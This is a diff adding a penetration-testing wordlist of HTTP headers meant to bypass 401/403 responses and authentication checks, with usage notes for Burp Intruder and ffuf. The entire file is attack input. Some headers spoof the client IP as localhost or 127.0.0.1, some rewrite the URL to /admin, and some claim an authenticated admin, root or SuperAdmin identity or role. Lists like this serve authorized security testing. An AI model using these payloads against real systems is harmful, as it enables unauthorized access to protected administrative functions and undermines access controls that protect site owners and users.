@@ -1,0 +1,51 @@
+# HTTP Headers for 401/403 and Authentication Bypass
+# Usage: Add to Burp Intruder, Match & Replace, or ffuf -H "Header: value"
+
+X-Original-URL: /admin
+X-Original-URL: /admin/
+X-Original-URL: /
+X-Rewrite-URL: /admin
+X-Rewrite-URL: /admin/
+X-Rewrite-URL: /
+X-Custom-IP-Authorization: 127.0.0.1
+X-Custom-IP-Authorization: localhost
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 127.0.0.1, 10.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded: 127.0.0.1
+X-Forwarded: localhost
+Forwarded-For: 127.0.0.1
+Forwarded-For: localhost
+Forwarded: for=127.0.0.1
+Forwarded: for=localhost
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Host: 127.0.0.1
+X-Host: localhost
+X-Real-IP: 127.0.0.1
+X-Real-IP: localhost
+True-Client-IP: 127.0.0.1
+True-Client-IP: localhost
+Client-IP: 127.0.0.1
+Client-IP: localhost
+X-Client-IP: 127.0.0.1
+X-Client-IP: localhost
+X-Remote-IP: 127.0.0.1
+X-Remote-IP: localhost
+X-Remote-Addr: 127.0.0.1
+X-Remote-Addr: localhost
+X-Originating-IP: 127.0.0.1
+X-Originating-IP: localhost
+CF-Connecting-IP: 127.0.0.1
+CF-Connecting-IP: localhost
+Fastly-Client-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+WL-Proxy-Client-IP: 127.0.0.1
+Proxy-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Authenticated-User: admin
+X-Authenticated-User: root
+X-User-Role: Admin
+X-User-Role: SuperAdmin
+X-Role: Admin
+X-Privilege: Admin
